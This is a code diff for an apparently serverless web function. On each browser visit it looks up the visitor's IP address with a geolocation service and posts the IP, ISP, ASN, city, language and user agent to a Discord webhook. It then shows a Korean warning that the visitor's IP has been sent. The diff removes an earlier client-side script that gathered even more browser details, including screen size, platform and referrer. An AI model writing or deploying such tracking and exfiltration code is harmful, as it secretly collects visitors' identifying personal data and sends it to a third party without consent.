@@ -10,19 +10,101 @@ function isBrowserRequest(headers) {
   return hasSecFetchMode || hasSecFetchDest || hasUpgradeInsecure || acceptsHtml;
 }
 
-function getClientIpFromHeaders(headers) {
+function getClientIp(headers) {
   const xff = headers.get('x-forwarded-for');
   if (xff) {
     return xff.split(',')[0].trim();
   }
-  return headers.get('x-nf-client-connection-ip') || headers.get('client-ip') || 'unknown';
+  return (
+    headers.get('x-nf-client-connection-ip') ||
+    headers.get('client-ip') ||
+    'unknown'
+  );
+}
+
+async function getIpDetails(ip) {
+  const fallback = {
+    ip,
+    isp: 'unknown',
+    org: 'unknown',
+    asn: 'unknown',
+    country: 'unknown',
+    region: 'unknown',
+    city: 'unknown',
+    timezone: 'Asia/Seoul'
+  };
+
+  try {
+    const target = ip && ip !== 'unknown'
+      ? `https://ipwho.is/${encodeURIComponent(ip)}`
+      : 'https://ipwho.is/';
+    const res = await fetch(target);
+    if (!res.ok) return fallback;
+    const data = await res.json();
+    if (data && data.success !== false) {
+      return {
+        ip: data.ip || ip,
+        isp: data.connection?.isp || data.isp || 'unknown',
+        org: data.connection?.org || data.org || 'unknown',
+        asn: data.connection?.asn ? `AS${data.connection.asn}` : (data.asn || 'unknown'),
+        country: data.country || 'unknown',
+        region: data.region || 'unknown',
+        city: data.city || 'unknown',
+        timezone: data.timezone?.id || 'Asia/Seoul'
+      };
+    }
+  } catch (_) {}
+
+  return fallback;
+}
+
+async function sendDiscordWebhook(headers) {
+  if (!WEBHOOK_URL) return;
+
+  const rawIp = getClientIp(headers);
+  const info = await getIpDetails(rawIp);
+
+  const now = new Date();
+  const kstTime = now.toLocaleString('ko-KR', {
+    timeZone: 'Asia/Seoul',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: false
+  });
+
+  const summary = [
+    `IP: ${info.ip}`,
+    `통신사(ISP): ${info.isp}`,
+    `조직(ORG): ${info.org}`,
+    `ASN: ${info.asn}`,
+    `시각(KST): ${kstTime}`,
+    `위치: ${info.country} / ${info.region} / ${info.city}`,
+    `시간대: ${info.timezone}`,
+    `언어: ${headers.get('accept-language') || 'unknown'}`,
+    `UA: ${headers.get('user-agent') || 'unknown'}`
+  ].join('\n');
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `\`\`\`\n${summary}\n\`\`\``
+      })
+    });
+  } catch (_) {}
 }
 
 export default async (req) => {
   const headers = req.headers;
-  const fallbackIp = getClientIpFromHeaders(headers);
 
   if (isBrowserRequest(headers)) {
+    await sendDiscordWebhook(headers);
+
     const html = `<!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -51,111 +133,6 @@ export default async (req) => {
 </head>
 <body>
   <p>해독하러 오지 마세요<br />당신의 IP주소가 전송됐습니다.</p>
-
-  <script>
-    (async () => {
-      const webhookUrl = ${JSON.stringify(WEBHOOK_URL)};
-      const fallbackIp = ${JSON.stringify(fallbackIp)};
-      if (!webhookUrl) return;
-
-      let ip = fallbackIp;
-      let isp = 'unknown';
-      let org = 'unknown';
-      let asn = 'unknown';
-      let country = 'unknown';
-      let region = 'unknown';
-      let city = 'unknown';
-      let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        if (ipRes.ok) {
-          const ipData = await ipRes.json();
-          if (ipData && ipData.ip) ip = ipData.ip;
-        }
-      } catch (_) {}
-
-      try {
-        const infoUrl = ip && ip !== 'unknown'
-          ? \`https://ipwho.is/\${encodeURIComponent(ip)}\`
-          : 'https://ipwho.is/';
-        const infoRes = await fetch(infoUrl);
-        if (infoRes.ok) {
-          const info = await infoRes.json();
-          if (info && info.success !== false) {
-            if (info.ip) ip = info.ip;
-            isp = info.connection?.isp || info.isp || isp;
-            org = info.connection?.org || info.org || org;
-            asn = info.connection?.asn ? \`AS\${info.connection.asn}\` : (info.asn || asn);
-            country = info.country || country;
-            region = info.region || region;
-            city = info.city || city;
-            timezone = info.timezone?.id || timezone;
-          }
-        }
-      } catch (_) {}
-
-      const now = new Date();
-      const kstTime = now.toLocaleString('ko-KR', {
-        timeZone: 'Asia/Seoul',
-        year: 'numeric',
-        month: '2-digit',
-        day: '2-digit',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: false
-      });
-
-      const extraInfo = {
-        ip,
-        isp,
-        org,
-        asn,
-        country,
-        region,
-        city,
-        timezone,
-        kstTime,
-        isoTime: now.toISOString(),
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.userAgentData?.platform || navigator.platform || 'unknown',
-        screen: \`\${screen.width}x\${screen.height}\`,
-        viewport: \`\${window.innerWidth}x\${window.innerHeight}\`,
-        referer: document.referrer || 'none',
-        url: location.href
-      };
-
-      const summary = [
-        \`IP: \${extraInfo.ip}\`,
-        \`통신사(ISP): \${extraInfo.isp}\`,
-        \`조직(ORG): \${extraInfo.org}\`,
-        \`ASN: \${extraInfo.asn}\`,
-        \`시각(KST): \${extraInfo.kstTime}\`,
-        \`위치: \${extraInfo.country} / \${extraInfo.region} / \${extraInfo.city}\`,
-        \`시간대: \${extraInfo.timezone}\`,
-        \`화면/뷰포트: \${extraInfo.screen} / \${extraInfo.viewport}\`,
-        \`언어/플랫폼: \${extraInfo.language} / \${extraInfo.platform}\`,
-        \`리퍼러: \${extraInfo.referer}\`,
-        \`UA: \${extraInfo.userAgent}\`
-      ].join('\\n');
-
-      const payload = {
-        content: \`\`\`\`\n\${summary}\n\`\`\`\`,
-        ...extraInfo
-      };
-
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-          mode: 'no-cors'
-        });
-      } catch (_) {}
-    })();
-  </script>
 </body>
 </html>`;
 
